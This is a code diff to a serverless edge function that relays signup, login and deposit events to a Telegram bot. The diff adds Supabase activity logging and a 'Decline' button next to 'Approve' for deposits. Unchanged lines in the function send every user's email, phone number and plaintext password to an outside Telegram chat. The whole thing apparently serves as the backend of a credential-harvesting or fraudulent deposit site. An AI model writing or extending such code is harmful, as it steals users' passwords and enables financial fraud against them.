@@ -1,4 +1,5 @@
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
   'Access-Control-Allow-Origin': '*',
@@ -7,6 +8,8 @@ const corsHeaders = {
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN')!;
 const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID')!;
+const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
+const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
 
 async function sendTelegramMessage(text: string, replyMarkup?: object) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -36,6 +39,7 @@ serve(async (req) => {
 
   try {
     const { type, email, phone, password, amount, userId } = await req.json();
+    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
 
     let message = '';
     let replyMarkup = undefined;
@@ -43,10 +47,20 @@ serve(async (req) => {
     switch (type) {
       case 'signup':
         message = `🔔 <b>New Registration</b>\n\n📧 Email: ${email}\n📱 Phone: ${phone || 'N/A'}\n🔑 Password: <code>${password || 'N/A'}</code>`;
+        await supabase.from('activity_logs').insert({
+          type: 'signup',
+          user_email: email,
+          details: `Phone: ${phone || 'N/A'}`,
+        });
         break;
 
       case 'login':
         message = `🔔 <b>User Login</b>\n\n📧 Email: ${email}\n🔑 Password: <code>${password || 'N/A'}</code>`;
+        await supabase.from('activity_logs').insert({
+          type: 'login',
+          user_email: email,
+          details: 'Logged in',
+        });
         break;
 
       case 'deposit':
@@ -55,8 +69,12 @@ serve(async (req) => {
           inline_keyboard: [
             [
               {
-                text: '✅ Approve Transaction',
+                text: '✅ Approve',
                 callback_data: `approve_${userId}_${amount}`,
+              },
+              {
+                text: '❌ Decline',
+                callback_data: `decline_${userId}_${amount}`,
               },
             ],
           ],
